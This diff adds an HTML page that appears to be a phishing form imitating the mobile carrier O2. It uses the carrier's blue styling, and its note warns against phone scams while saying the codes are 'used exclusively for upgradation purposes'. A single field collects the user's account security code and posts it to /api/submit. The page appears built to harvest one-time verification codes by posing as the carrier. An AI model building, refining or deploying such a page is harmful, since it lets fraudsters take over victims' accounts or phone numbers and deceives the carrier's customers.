@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Code Submission</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      text-align: center;
+    }
+    .note {
+      font-size: 14px;
+      color: #0019A5; /* Changed to O2 blue */
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0019A5; /* Changed to O2 blue */
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #001489; /* Slightly darker blue for hover effect */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="note">
+      <strong>Note:</strong> We will never ask for your personal details over the phone. If someone contacts you claiming to be from our team and requests this information, do not share it. These security codes are valid only for your account and are used exclusively for upgradation purposes.
+    </div>
+    <form id="securityCodeForm">
+      <div class="form-group">
+        <label for="securityCode">Enter Security Code:</label>
+        <input type="text" id="securityCode" name="securityCode" placeholder="Enter your security code" required />
+      </div>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('securityCodeForm').addEventListener('submit', async (e) => {
+      e.preventDefault(); // Prevent default form submission
+
+      // Get the security code value
+      const securityCode = document.getElementById('securityCode').value;
+
+      try {
+        // Send the security code to the API endpoint
+        const response = await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ securityCode }),
+        });
+
+        if (response.ok) {
+          alert('Security code submitted successfully!');
+        } else {
+          alert('An error occurred. Please try again.');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again later.');
+      }
+    });
+  </script>
+</body>
+</html>
